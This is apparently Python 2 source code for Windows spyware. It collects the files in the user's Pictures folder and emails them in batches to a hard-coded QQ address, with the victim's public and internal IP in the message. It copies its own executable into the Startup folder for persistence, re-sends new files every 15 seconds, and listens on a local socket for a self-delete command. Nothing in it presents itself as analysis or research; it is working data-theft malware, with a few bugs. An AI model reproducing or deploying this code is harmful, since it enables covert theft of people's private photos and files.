#default is windows os

#given the default dir is Pictures

import os
import time
import socket
import sys
import logging
import threading
import shutil
import socket
import thread
from urllib2 import urlopen

from multiprocessing import Process
from threading import Semaphore

import email_client
import files_filter
import config_utils
import http_server

current_public_ip = urlopen('http://ip.42.pl/raw').read()
current_inner_ip = socket.gethostbyname(socket.gethostname())
current_time = time.strftime("%Y-%m-%d %H:%M:%S")

logging.basicConfig(
    filename="%s.log"%time.strftime("%Y-%m-%d %H-%M-%S"),
    format='%(asctime)s %(levelname)s %(message)s',
    level=logging.INFO)

logging.getLogger().addHandler(logging.StreamHandler())
sys_status = True



ATTACHMENT_SIZE = 2

target_email = "848334436@qq.com"
subject = "From %s computer" %current_public_ip
content = current_time +"\r %s" %current_inner_ip

current_time = time.strftime("%Y-%m-%d %H:%M:%S")

sys_init_time = 0
last_send_time = 0
execute_time = 15 #one day to execute

#test passed
def _add_to_startup():
    pic_path = os.path.join(os.path.expandvars("%userprofile%"),
            "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
    shutil.copy2(os.getcwd() +'/'+ os.path.splitext(__file__)[0] + ".exe",\
                pic_path + os.path.splitext(__file__)[0] + ".exe")
    logging.info("Add to startup successly")

def _delete_exe():
    exe_path = os.path.join(os.path.expandvars("%userprofile%"),\
            "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
    #exe_path += os.path.splitext(__file__)[0] + ".exe"
    exe_path += os.path.splitext(__file__)[0] + ".exe"

    with open(exe_path + 'protect.bat','w') as f:
        #delay 5s to delete the exe file
        f.write("@ping 127.0.0.1 -n 5 -w 1000 > nul\n")
        #f.write("del %s\n" %exe_path)
        #if the path contains space, add "your path"
        f.write('del "%s"\n' %py_path)
        f.close()
    p = Popen(exe_path + 'protect.bat',cwd=exe_path)
    stdout, stderr = p.communicate()

    logging.info("Clean up!")

def _socket_server():
    logging.info('---------socket_server start-------------')
    print '---------socket_server start-------------'
    HOST = '127.0.0.1'
    PORT = 9000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST,PORT))
    s.listen(1)
    flag = True
    global sys_status
    count = 0


    while flag:
        start_time = time.time()

        flag += 1
        logging.info("ss while loop %s" %flag)
        conn,addr = s.accept()
        data = conn.recv(1024)
        if not data:
            #time.sleep(10)

            break
        if data == "delete":
            #threading.Thread(target=_running(handle_path, config_location)).stop()
            sys_status = False
            _delete_exe()
            conn.sendall("Success Deleted!")
            logging.info("System End!")
            flag = False
            s.close()
            ss_semaphore.release()


#test passed
def _init(pic_path, config_location):
    logging.info("------------------------------------")
    logging.info("System initing....\r")

    logging.info("System init will start in 5 s")
    time.sleep(5)
    #write_notation()

    files_list = []
    current_files_size = 0
    attachment_size = 0

    for path in pic_path:
        logging.info("Working dir is %s" %path)
        for root, dirs, files in os.walk(path):
            for name in files:
                full_name = root + '/' + name
                logging.info("File %s add to list" %full_name)
                files_list.append(full_name)

                attachment_size += 1
                #transfer to MB
                current_files_size += files_filter.get_file_mb_size(full_name)

                #if the current files size bigger than 20MB It will send and files_list will init to []
                if current_files_size <=20:
                    if attachment_size == ATTACHMENT_SIZE:
                        logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)
                        logging.info("SEND %s" %files_list)
                        email_client.mail(target_email,
                           subject,
                           content,
                           files_list)
                        logging.info("System pause for 5 seconds")
                        time.sleep(5)
                        files_list = []
                        current_files_size = 0
                        attachment_size = 0
    if files_list != []:
        email_client.mail(target_email,
               subject,
               content,
               files_list)

    sys_init_time = time.time()
    global last_send_time
    last_send_time = sys_init_time

    config_utils._update_config(config_location,'filesys','is_first_time','false')
    _add_to_startup()
    logging.info("System initing send time %s" %last_send_time)
    logging.info("System inited at %s." %time.strftime("%Y-%m-%d %H:%M:%S"))
    logging.info("System init end")
    logging.info("------------------------------------")
#test passed. But not well
def _single_file_monitor(f):
    global last_send_time
    # if last_send_time == 0:
    #     with open("p.txt",'r+') as f:
    #         f.readline()
    #         last_send_time = f.readline()
    #         if last_send_time == "":
    #             last_send_time = time.time()
    #         logging.info("Read Last Send Time Successly--%s" % last_send_time)
    #         f.close()

    f_create_time = time.mktime(time.strptime(time.ctime(os.path.getctime(f)),"%a %b %d %H:%M:%S %Y"))
    if (f_create_time - last_send_time) > 0:
        #logging.info("File %s created at %s\r"%(f,f_create_time))
        #logging.info("Last Send Time %s" %last_send_time)
        logging.info("Check File Success. Will Send")
        return True
    else:
        return False

def _running(pic_path):

    files_to_send = []
    send_times = 0
    global last_send_time
    global sys_status
    current_files_size = 0
    attachment_size = 0

    while sys_status:
        updated_files = []
        files_list = []

        for path in pic_path:
            #get all files in path
            for root, dirs, files in os.walk(path):
                for name in files:
                    full_name = root + '/' + name
                    files_list.append(full_name)

            #check the files in list are the newest!
            #print files_list
            for f_name in files_list:
                if _single_file_monitor(f_name):
                    updated_files.append(f_name)
                    #logging.info("File %s are the new!")%f_name
                    attachment_size += 1
                    current_files_size += files_filter.get_file_mb_size(full_name)

                    if updated_files == []:
                        logging.info("Entering wait condition")

                    elif attachment_size == ATTACHMENT_SIZE and updated_files != []:

                        logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)
                        email_client.mail(target_email,
                           subject,
                           content,
                           updated_files)

                        updated_files = []
                        current_files_size = 0
                        attachment_size = 0
                        send_times += 1
                        last_send_time = time.time()
                        logging.info("File sent at %s " %time.ctime())
                else:
                    logging.info("File %s will not be sent twice" %f_name)


            if updated_files!= []:
                email_client.mail(target_email,
                                    subject,
                                    content,
                                    updated_files)
                send_times += 1
                last_send_time = time.time()
                logging.info("File sent at %s " %time.ctime())


        #logging.info("System sleep %s seconds" %execute_time)
        logging.info("System has sent %s mails" %send_times)
        time.sleep(execute_time)







if __name__ == '__main__':
    try:
        pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")
        handle_path = []
        #handle_path.append(pic_path)
        handle_path.append("C:/Users/jason03.zhang/Pictures/Pictures/Pictures/Sample Pictures")

        exe_path = os.path.join(os.path.expandvars("%userprofile%"),
                "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
        config_location = exe_path + 'config.cfg'

        info, is_first_time = config_utils._read_config(config_location)
        logging.info(info)


        running_semaphore = Semaphore(1)
        ss_semaphore = Semaphore(0)
        if is_first_time:
            config_utils._init_config(config_location)
            _init(handle_path,config_location)

        # thread.start_new_thread(_running,(handle_path,))
        # thread.start_new_thread(_socket_server,())
        running = threading.Thread(target=_running(handle_path))
        ss = threading.Thread(target=_socket_server())

        running.setDaemon(True)
        ss.setDaemon(True)

        running.start()
        ss.start()
        #running.join()
        #ss.join()
            #
            #
            # running = Process(target=_running, args=(handle_path,))
            # ss = Process(target=_socket_server,args=())
            #
            # running.start()
            # running.join()
            #
            # p.start()
            # p.join()
        #config_location = config_utils._init_config(exe_path + 'config.cfg')


        # try:
        #     with open('p.txt','r+') as pid:
        #         p = pid.readline()
        #         if p == '0':
        #             logging.info("Not the first time start program")
        #             pid.close()
        #             threading.Thread(target=_running(handle_path)).start()
        #         else:
        #             pid.close()
        #             _init(handle_path)
        #             threading.Thread(target=_running(handle_path)).start()
        # except IOError:
        #     logging.info("The first time starts programs")
        #     _init(handle_path)
        #     threading.Thread(target=_running(handle_path)).start()

        #handle_path.append("C:/Users/jason03.zhang/Pictures/Pictures/Pictures/Sample Pictures")
    except KeyboardInterrupt:
        sys.exit()
